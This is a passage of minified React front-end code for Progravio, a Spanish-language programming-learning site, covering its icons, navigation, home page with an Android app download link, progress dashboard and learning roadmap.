24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polygon",attr:{points:"22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"},child:[]}]})(a)}function jc(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"circle",attr:{cx:"12",cy:"12",r:"10"},child:[]},{tag:"line",attr:{x1:"2",y1:"12",x2:"22",y2:"12"},child:[]},{tag:"path",attr:{d:"M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"},child:[]}]})(a)}function Br(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"3",y:"3",width:"7",height:"7"},child:[]},{tag:"rect",attr:{x:"14",y:"3",width:"7",height:"7"},child:[]},{tag:"rect",attr:{x:"14",y:"14",width:"7",height:"7"},child:[]},{tag:"rect",attr:{x:"3",y:"14",width:"7",height:"7"},child:[]}]})(a)}function Ug(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polygon",attr:{points:"12 2 2 7 12 12 22 7 12 2"},child:[]},{tag:"polyline",attr:{points:"2 17 12 22 22 17"},child:[]},{tag:"polyline",attr:{points:"2 12 12 17 22 12"},child:[]}]})(a)}function tp(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"3",y:"3",width:"18",height:"18",rx:"2",ry:"2"},child:[]},{tag:"line",attr:{x1:"3",y1:"9",x2:"21",y2:"9"},child:[]},{tag:"line",attr:{x1:"9",y1:"21",x2:"9",y2:"9"},child:[]}]})(a)}function bN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"},child:[]},{tag:"path",attr:{d:"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"},child:[]}]})(a)}function vN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"},child:[]},{tag:"polyline",attr:{points:"16 17 21 12 16 7"},child:[]},{tag:"line",attr:{x1:"21",y1:"12",x2:"9",y2:"12"},child:[]}]})(a)}function yN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"line",attr:{x1:"3",y1:"12",x2:"21",y2:"12"},child:[]},{tag:"line",attr:{x1:"3",y1:"6",x2:"21",y2:"6"},child:[]},{tag:"line",attr:{x1:"3",y1:"18",x2:"21",y2:"18"},child:[]}]})(a)}function EN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"},child:[]}]})(a)}function SN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"5 9 2 12 5 15"},child:[]},{tag:"polyline",attr:{points:"9 5 12 2 15 5"},child:[]},{tag:"polyline",attr:{points:"15 19 12 22 9 19"},child:[]},{tag:"polyline",attr:{points:"19 9 22 12 19 15"},child:[]},{tag:"line",attr:{x1:"2",y1:"12",x2:"22",y2:"12"},child:[]},{tag:"line",attr:{x1:"12",y1:"2",x2:"12",y2:"22"},child:[]}]})(a)}function CN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"line",attr:{x1:"16.5",y1:"9.4",x2:"7.5",y2:"4.21"},child:[]},{tag:"path",attr:{d:"M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"},child:[]},{tag:"polyline",attr:{points:"3.27 6.96 12 12.01 20.73 6.96"},child:[]},{tag:"line",attr:{x1:"12",y1:"22.08",x2:"12",y2:"12"},child:[]}]})(a)}function AN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"line",attr:{x1:"12",y1:"5",x2:"12",y2:"19"},child:[]},{tag:"line",attr:{x1:"5",y1:"12",x2:"19",y2:"12"},child:[]}]})(a)}function TN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"23 4 23 10 17 10"},child:[]},{tag:"polyline",attr:{points:"1 20 1 14 7 14"},child:[]},{tag:"path",attr:{d:"M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"},child:[]}]})(a)}function xN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"circle",attr:{cx:"11",cy:"11",r:"8"},child:[]},{tag:"line",attr:{x1:"21",y1:"21",x2:"16.65",y2:"16.65"},child:[]}]})(a)}function Jh(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"2",y:"2",width:"20",height:"8",rx:"2",ry:"2"},child:[]},{tag:"rect",attr:{x:"2",y:"14",width:"20",height:"8",rx:"2",ry:"2"},child:[]},{tag:"line",attr:{x1:"6",y1:"6",x2:"6.01",y2:"6"},child:[]},{tag:"line",attr:{x1:"6",y1:"18",x2:"6.01",y2:"18"},child:[]}]})(a)}function Pc(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"},child:[]}]})(a)}function Bg(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polygon",attr:{points:"12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"},child:[]}]})(a)}function Y1(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"3 6 5 6 21 6"},child:[]},{tag:"path",attr:{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"},child:[]},{tag:"line",attr:{x1:"10",y1:"11",x2:"10",y2:"17"},child:[]},{tag:"line",attr:{x1:"14",y1:"11",x2:"14",y2:"17"},child:[]}]})(a)}function jN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"3",y:"11",width:"18",height:"11",rx:"2",ry:"2"},child:[]},{tag:"path",attr:{d:"M7 11V7a5 5 0 0 1 9.9-1"},child:[]}]})(a)}function nj(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"},child:[]},{tag:"circle",attr:{cx:"12",cy:"7",r:"4"},child:[]}]})(a)}function oj(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"line",attr:{x1:"18",y1:"6",x2:"6",y2:"18"},child:[]},{tag:"line",attr:{x1:"6",y1:"6",x2:"18",y2:"18"},child:[]}]})(a)}function wn(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polygon",attr:{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2"},child:[]}]})(a)}const PN=()=>{const{isAdmin:a,user:e,logout:t}=or(),{navConfig:o,isPathEnabled:r}=x_(),l=Bn(),[c,d]=F.useState(!1),f=[{path:"/",label:"Home"},{path:"/roadmap",label:o["/roadmap"]?.label||"Ruta"},{path:"/libraries",label:o["/libraries"]?.label||"Librerias"},{path:"/cheatsheets",label:o["/cheatsheets"]?.label||"Trucos"},{path:"/projects",label:o["/projects"]?.label||"Proyectos"},{path:"/div-playground",label:o["/div-playground"]?.label||"<div />"}],p=()=>d(!c),v=()=>d(!1);return g.jsxs("nav",{className:"navbar",children:[g.jsx("div",{className:"navbar-logo",children:g.jsx(Xt,{to:"/",onClick:v,children:"Progravio"})}),g.jsx("div",{className:"navbar-search-desktop",children:g.jsx(G1,{})}),g.jsx("button",{className:"mobile-menu-btn",onClick:p,"aria-label":"Toggle menu",children:c?g.jsx(oj,{size:24}):g.jsx(yN,{size:24})}),g.jsxs("ul",{className:`navbar-links ${c?"mobile-open":""}`,children:[g.jsx("li",{className:"mobile-search-item",children:g.jsx(G1,{})}),f.map(y=>r(y.path)&&g.jsx("li",{children:g.jsx(Xt,{to:y.path,className:`${l.pathname===y.path?"active":""} ${y.path==="/div-playground"?"div-link":""}`,onClick:v,children:y.label})},y.path)),a&&g.jsx("li",{children:g.jsx(Xt,{to:"/admin",className:"admin-link",onClick:v,children:"Admin"})}),e?g.jsxs(g.Fragment,{children:[g.jsx("li",{children:g.jsxs(Xt,{to:"/profile",className:l.pathname==="/profile"?"active":"",onClick:v,children:[g.jsx(nj,{className:"nav-icon"})," Perfil"]})}),g.jsx("li",{children:g.jsxs("button",{onClick:()=>{t(),v()},className:"logout-btn",children:[g.jsx(vN,{})," Salir"]})})]}):g.jsx("li",{children:g.jsx(Xt,{to:"/login",className:"login-link",onClick:v,children:"Entrar"})})]}),c&&g.jsx("div",{className:"navbar-overlay",onClick:v})]})},qN=()=>g.jsxs("footer",{className:"footer",children:[g.jsxs("div",{className:"footer-content",children:[g.jsxs("div",{className:"footer-brand",children:[g.jsxs("div",{className:"footer-logo",children:[g.jsx("span",{className:"code-icon",children:"</>"}),g.jsx("span",{children:"Progravio"})]}),g.jsx("p",{className:"footer-description",children:"Potenciando la prxima generacin de creadores a travs de una educacin en programacin accesible y de alta calidad."})]}),g.jsxs("div",{className:"footer-links",children:[g.jsxs("div",{className:"link-column",children:[g.jsx("h4",{children:"Aprender"}),g.jsxs("ul",{children:[g.jsx("li",{children:g.jsx("a",{href:"#",children:"Python"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"JavaScript"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"HTML & CSS"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"SQL"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Ciencia de Datos"})})]})]}),g.jsxs("div",{className:"link-column",children:[g.jsx("h4",{children:"Recursos"}),g.jsxs("ul",{children:[g.jsx("li",{children:g.jsx("a",{href:"#",children:"Cheatsheets"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Blog"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Consejos de Carrera"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Foros"})})]})]}),g.jsxs("div",{className:"link-column",children:[g.jsx("h4",{children:"Compaa"}),g.jsxs("ul",{children:[g.jsx("li",{children:g.jsx("a",{href:"#",children:"Sobre Nosotros"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Carreras"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Trminos"})}),g.jsx("li",{children:g.jsx("a",{href:"#",children:"Privacidad"})})]})]})]})]}),g.jsxs("div",{className:"footer-bottom",children:[g.jsx("div",{className:"copyright",children:" 2025 Progravio Inc. Todos los derechos reservados."}),g.jsxs("div",{className:"credits",children:["Creado por ",g.jsx("a",{href:"https://octavio-gonzalez.web.app",target:"_blank",rel:"noopener noreferrer",className:"author-link",children:"Octavio Gonzalez"})]}),g.jsx("div",{className:"system-status",children:g.jsx("span",{className:"status-dot"})})]})]}),RN=({children:a})=>g.jsxs("div",{className:"layout",children:[g.jsx(PN,{}),g.jsx("main",{className:"main-content",children:a}),g.jsx(qN,{})]});function LN(a){return Ze({attr:{viewBox:"0 0 576 512"},child:[{tag:"path",attr:{d:"M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"},child:[]}]})(a)}function ij(a){return Ze({attr:{viewBox:"0 0 512 512"},child:[{tag:"path",attr:{d:"M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"},child:[]}]})(a)}function rj(a){return Ze({attr:{viewBox:"0 0 496 512"},child:[{tag:"path",attr:{d:"M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"},child:[]}]})(a)}function sj(a){return Ze({attr:{viewBox:"0 0 488 512"},child:[{tag:"path",attr:{d:"M488 261.8C488 403.3 391.1 504 248 504 110.8 504 0 393.2 0 256S110.8 8 248 8c66.8 0 123 24.5 166.3 64.9l-67.5 64.9C258.5 52.6 94.3 116.6 94.3 256c0 86.5 69.1 156.6 153.7 156.6 98.2 0 135-70.4 140.8-106.9H248v-85.3h236.1c2.3 12.7 3.9 24.9 3.9 41.4z"},child:[]}]})(a)}const IN=()=>{const a=ir(),[e,t]=mt.useState(null);return mt.useEffect(()=>{fetch("https://raw.githubusercontent.com/Owning01/progra-public-releases/main/version.json").then(o=>o.json()).then(o=>{o.apk_url&&t(o.apk_url)}).catch(o=>console.error("Error checking updates:",o))},[]),g.jsx("div",{className:"home-container",children:g.jsxs("header",{className:"home-hero",children:[g.jsx("h1",{className:"home-title",children:"Domina el cdigo con Progravio"}),g.jsx("p",{className:"home-description",children:"Tu camino desde los fundamentos hasta el nivel avanzado en el desarrollo de software. Aprende paso a paso con una estructura clara y mucha prctica."}),g.jsxs("div",{className:"home-actions",children:[g.jsx("button",{className:"btn-home btn-home-primary",onClick:()=>a("/roadmap"),children:"Comenzar Ruta"}),g.jsx("button",{className:"btn-home btn-home-secondary",onClick:()=>a("/profile"),children:"Ver mi Perfil"})]}),e&&g.jsx("div",{className:"download-section",children:g.jsxs("a",{href:e,className:"btn-download-apk",target:"_blank",rel:"noopener noreferrer",children:[g.jsx(LN,{className:"android-icon"})," Descarga para Android"]})})]})})},DN=()=>{const{getModuleProgress:a,favorites:e,xp:t,calculateLevel:o}=gl(),{level:r,nextLevelXp:l,currentLevelMin:c}=o(t),d=(t-c)/(l-c)*100,f=bv.map(p=>({id:p.id,name:p.title.split(":")[0],description:p.description,progress:a(p.id,p.lessons.length)}));return g.jsxs("div",{className:"dashboard-container",children:[g.jsxs("div",{className:"dashboard-header",children:[g.jsxs("div",{children:[g.jsx("h1",{className:"dashboard-title",children:"Mi Progreso"}),g.jsx("p",{className:"dashboard-subtitle",children:"Sigue tu avance en la ruta de aprendizaje."})]}),g.jsxs("div",{className:"xp-card",children:[g.jsxs("div",{className:"xp-level",children:["Nivel ",r]}),g.jsxs("div",{className:"xp-stats",children:[g.jsxs("span",{className:"xp-current",children:[t," XP"]}),g.jsxs("span",{className:"xp-next",children:[l," XP"]})]}),g.jsx("div",{className:"xp-progress-bar",children:g.jsx("div",{className:"xp-progress-fill",style:{width:`${d}%`}})})]})]}),g.jsx("div",{className:"modules-grid",children:f.map(p=>g.jsxs("div",{className:"module-card",children:[g.jsxs("div",{className:"module-info",children:[g.jsxs("h3",{children:[p.name,p.progress===100&&g.jsx("span",{className:"completed-check",children:" "})]}),g.jsx("p",{children:p.description})]}),g.jsxs("div",{className:"module-progress-section",children:[g.jsx("div",{className:"progress-bar-container",children:g.jsx("div",{className:"progress-bar-fill",style:{width:`${p.progress}%`}})}),g.jsx("span",{className:"progress-percentage",children:p.progress===100?" Completado":`${p.progress}%`})]})]},p.id))}),Object.keys(e).length>0&&g.jsxs("div",{className:"favorites-section",children:[g.jsx("h2",{className:"dashboard-title",children:"Mis Favoritos "}),g.jsx("div",{className:"favorites-grid",children:Object.entries(e).map(([p,v])=>g.jsxs(Xt,{to:`/learn/${v.moduleId}?lesson=${p}`,className:"favorite-card",children:[g.jsx("span",{className:"fav-module",children:v.moduleTitle.split(":")[0]}),g.jsx("h4",{children:v.lessonTitle})]},p))})]})]})},wN={levels:[{name:"Fundamentos",description:"Las bases de la lgica y la programacin.",skills:["Pensamiento Lgico","Algoritmos Bsicos","Variables y Tipos","Matemtica Aplicada"],modules:[rv.id,sv.id,Wx.id]},{name:"Desarrollo Web",description:"Creacin de interfaces y experiencias de usuario.",skills:["HTML Semntico","CSS Moderno","JavaScript DOM"],modules:[nv.id,Zb.id,iv.id]},{name:"Frontend Moderno",description:"Interfaces interactivas y escalables con tecnologas actuales.",skills:["Componentes React","TypeScript Essentials","Tailwind CSS Stylings"],modules:[hv.id,dv.id,fv.id]},{name:"Backend",description:"Lgica de servidor, APIs y manejo de datos.",skills:["Servidores HTTP","REST APIs","Node.js","Python"],modules:[lv.id,uv.id,ov.id,Xb.id]},{name:"Bases de Datos",description:"Persistencia y modelado de datos.",skills:["SQL","NoSQL","ORM","Modelado Relacional"],modules:[Fx.id,mv.id,cv.id]},{name:"Testing",description:"Aseguramiento de la calidad del software.",skills:["Unit Testing","Integration Testing","TDD"],modules:[Yx.id]},{name:"DevOps",description:"Automatizacin, despliegue y operaciones.",skills:["CI/CD","Docker","Cloud Basics"],modules:[Hx.id]},{name:"Redes",description:"Cmo funciona internet por debajo.",skills:["HTTP","TCP/IP","DNS","CORS"],modules:[Qx.id]},{name:"Algoritmos",description:"Optimizacin y resolucin de problemas complejos.",skills:["Big O","rboles","Grafos","Hash Maps"],modules:[Nx.id]},{name:"Ingeniera de Software",description:"Arquitectura, patrones y cdigo limpio.",skills:["Clean Code","SOLID","Patrones de Diseo","Arquitectura Hexagonal"],modules:[$x.id,Bx.id,Ox.id]},{name:"Git & GitHub",description:"Control de versiones y colaboracin profesional.",skills:["Git Flow","Pull Requests","Code Review"],modules:[av.id]},{name:"Especializacin",description:"Tecnologas avanzadas y herramientas esenciales.",skills:["Formatos de Datos","Scripting","APIs Modernas","WebAssembly"],modules:[ev.id,pv.id,tv.id,gv.id,Yb.id]}]},lj=[nv,Zb,iv,hv,dv,fv,lv,uv,mv,ov,Jx,Xb,Zx,Yb,tv,gv,pv,ev,Kx,zx,av,Gx,Vx,cv,Xx,rv,sv,Ux],X1={html:"/img/html.png",css:"/img/css.png",js:"/img/js.png","ts-module":"/img/ts.png","react-module":"/img/react.png",node:"/img/nodejs.png",python:"/img/python.png",java:"/img/java.png",csharp:"/img/csharp.png",kotlin:"/img/kotlin.png",sql:"/img/sql.png",bash:"/img/bash.jpg",graphql:"/img/graphql.jpg",wasm:"/img/webassembly.jpg",xaml:"/img/xaml.jpg",regex:"/img/regex.jpg","data-formats":"/img/yaml-toml.jpg",security:"/img/seguridad.jpg","auth-security":"/img/infosec.jpg",tailwind:"/img/tailwind.png","prog-bases":"/img/algoritmos.jpg",db:"/img/backend.png",testing:"/img/testing.jpg","deploy-devops":"/img/deploy.jpg",devops:"/img/deploy.jpg","cloud-computing":"/img/deploy.jpg",networking:"/img/redes.jpg","algo-structures":"/img/datastructures.jpg","software-engineering":"/img/software-engineering.jpg","clean-code":"/img/cleancode.jpg",architecture:"/img/arquitectura.jpg","git-version-control":"/img/git.jpg","linux-basics":"/img/bash.jpg","docker-containers":"/img/deploy.jpg",default:"/img/module-default.png"},MN=()=>{const a=ir(),[e,t]=F.useState("career"),{history:o}=gl(),r=l=>X1[l]||X1.default;return g.jsxs("div",{className:"roadmap-container new-structure",children:[o&&o.length>0&&g.jsxs("section",{className:"learning-history animate-fade-in",children:[g.jsx("div",{className:"history-header",children:g.jsx("h3",{children:" Continuar Aprendiendo"})}),g.jsx("div",{className:"history-scroll-container",children:g.jsx("div",{className:"history-track",children:o.slice(0,6).map((l,c)=>g.jsxs("div",{className:"history-card",onClick:()=>a(`/learn/${l.moduleId}?lesson=${l.lessonId}`),children:[g.jsx("div",{className:"history-card-icon",children:g.jsx("img",{src:r(l.moduleId),alt:l.moduleTitle})}),g.jsxs("div",{className:"history-card-info",children:[g.jsx("h4",{children:l.lessonTitle}),g.jsx("span",{children:l.moduleTitle})]})]},`${l.lessonId}-${c}`))})})]}),g.jsxs("div",{className:"sticky-header",children:[g.jsxs("header",{className:"roadmap-main-header",children:[g.jsx("h1",{children:e==="career"?"Plan de Carrera Profesional":"Librera de Conocimiento"}),g.jsx("p",{className:"subtitle",children:e==="career"?"Sigue el camino estructurado para convertirte en Senior Engineer.":"Mdulos independientes para potenciar tu stack tecnolgico."})]}),g.jsxs("div",{className:"roadmap-tabs",children:[g.jsx("button",{className:`tab-btn ${e==="career"?"active":""}`,onClick:()=>t("career"),children:" Roadmap Principal"}),g.jsx("button",{className:`tab-btn ${e==="library"?"active":""}`,onClick:()=>t("library"),children:" Biblioteca de Mdulos"})]})]}),g.jsxs("div",{className:"roadmap-content-area",children:[e==="career"&&g.jsx("section",{className:"roadmap-section hierarchical animate-fade-in",children:g.jsx("div",{className:"roadmap-timeline",children:wN.levels.map((l,c)=>g.jsxs("div",{className:"roadmap-level-card",children:[g.jsxs("div",{className:"level-header",children:[g.jsx("span",{className:"level-badge",children:l.name}),g.jsx("p",{className:"level-desc",children:l.description})]}),g.jsxs("div",{className:"level-body",children:[g.jsxs("div",{className:"skills-column",children:[g.jsx("h4",{children:"Habilidades Clave:"}),g.jsx("div",{className:"skills-tags",children:l.skills.map((d,f)=>g.jsx("span",{className:"skill-tag",children:d},f))})]}),g.jsxs("div",{className:"modules-column",children:[g.jsx("h4",{children:"Mdulos:"}),g.jsxs("div",{className:"modules-grid-mini",children:[l.modules.map(d=>{const f=ej(d);return f?g.jsxs("div",{className:"module-card-mini",onClick:()=>a(`/learn/${f.id}`),title:f.title,children:[g.jsx("img",{src:r(f.id),alt:f.title,className:"mod-icon-img mini"}),g.jsx("span",{className:"mod-title",children:f.title})]},d):null}),l.modules.length===0&&g.jsx("span",{className:"coming-soon",children:"Prximamente..."})]})]})]})]},c))})}),e==="library"&&g.jsx("section",{className:"roadmap-section independent animate-fade-in",children:g.jsxs("div",{className:"independent-modules-grid",children:[lj.map(l=>g.jsxs("div",{className:"ind-module-card",onClick:()=>a(`/learn/${l.id}`),children:[g.jsxs("div",{className:"card-top",children:[g.jsx("div",{className:"icon-wrapper",children:g.jsx("img",{src:r(l.id),alt:l.title,className:"mod-icon-img large"})}),g.jsx("span",{className:"track-tag",children:l.track||"Tech"})]}),g.jsx("h3",{children:l.title}),g.jsx("p",{children:l.description})]},l.id)),["docker-containers","linux-basics"].map(l=>g.jsxs("div",{className:"ind-module-card coming-soon-card",children:[g.jsxs("div",{className:"card-top",children:[g.jsx("div",{className:"icon-wrapper",children:g.jsx("img",{src:r(l),alt:"Coming Soon",className:"mod-icon-img large grayscale"})}),g.jsx("span",{className:"track-tag",children:"Prximamente"})]}),g.jsx("h3",{children:l.replace(/-/g," ").toUpperCase()}),g.jsx("p",{children:"Contenido en desarrollo..."})]},l))]})})]})]})},np=({code:a,language:e})=>g.jsxs("div",{className:"code-block-container",children:[e&&g.jsx("div",{className:"code-block-header",children:e}),g.jsx("div",{className:"code-block-content",children:g.jsx("pre",{children:g.jsx("code",{children:a.trim()})})})]});function _N(a,e){const t={};return(a[a.length-1]===""?[...a,""]:a).join((t.padRight?" ":"")+","+(t.padLeft===!1?"":" ")).trim()}const kN=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,NN=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,ON={};function Z1(a,e){return(ON.jsx?NN:kN).test(a)}const zN=/[ \t\n\f\r]/g;function UN(a){return typeof a=="object"?a.type==="text"?eA(a.value):!1:eA(a)}function eA(a){return a.replace(zN,"")===""}class Cu{constructor(e,t,o){this.normal=t,this.property=e,o&&(this.space=o)}}Cu.prototype.normal={};Cu.prototype.property={};Cu.prototype.space=void 0;function cj(a,e){const t={},o={};for(const r of a)Object.assign(t,r.property),Object.assign(o,r.normal);return new Cu(t,o,e)}function Vg(a){return a.toLowerCase()}class zt{constructor(e,t){this.attribute=t,this.property=e}}zt.prototype.attribute="";zt.prototype.booleanish=!1;zt.prototype.boolean=!1;zt.prototype.commaOrSpaceSeparated=!1;zt.prototype.commaSeparated=!1;zt.prototype.defined=!1;zt.prototype.mustUseProperty=!1;zt.prototype.number=!1;zt.prototype.overloadedBoolean=!1;zt.prototype.property="";zt.prototype.spaceSeparated=!1;zt.prototype.space=void 0;let BN=0;const Ve=as(),$a=as(),Fg=as(),he=as(),Aa=as(),al=as(),$t=as();function as(){return 2**++BN}const Hg=Object.freeze(Object.defineProperty({__proto__:null,boolean:Ve,booleanish:$a,commaOrSpaceSeparated:$t,commaSeparated:al,number:he,overloadedBoolean:Fg,spaceSeparated:Aa},Symbol.toStringTag,{value:"Module"})),Qh=Object.keys(Hg);class vv extends zt{constructor(e,t,o,r){let l=-1;if(super(e,t),aA(this,"space",r),typeof o=="number")for(;++l<Qh.length;){const c=Qh[l];aA(this,Qh[l],(o&Hg[c])===Hg[c])}}}vv.prototype.defined=!0;function aA(a,e,t){t&&(a[e]=t)}function El(a){const e={},t={};for(const[o,r]of Object.entries(a.properties)){const l=new vv(o,a.transform(a.attributes||{},o),r,a.space);a.mustUseProperty&&a.mustUseProperty.includes(o)&&(l.mustUseProperty=!0),e[o]=l,t[Vg(o)]=o,t[Vg(l.attribute)]=o}return new Cu(e,t,a.space)}const 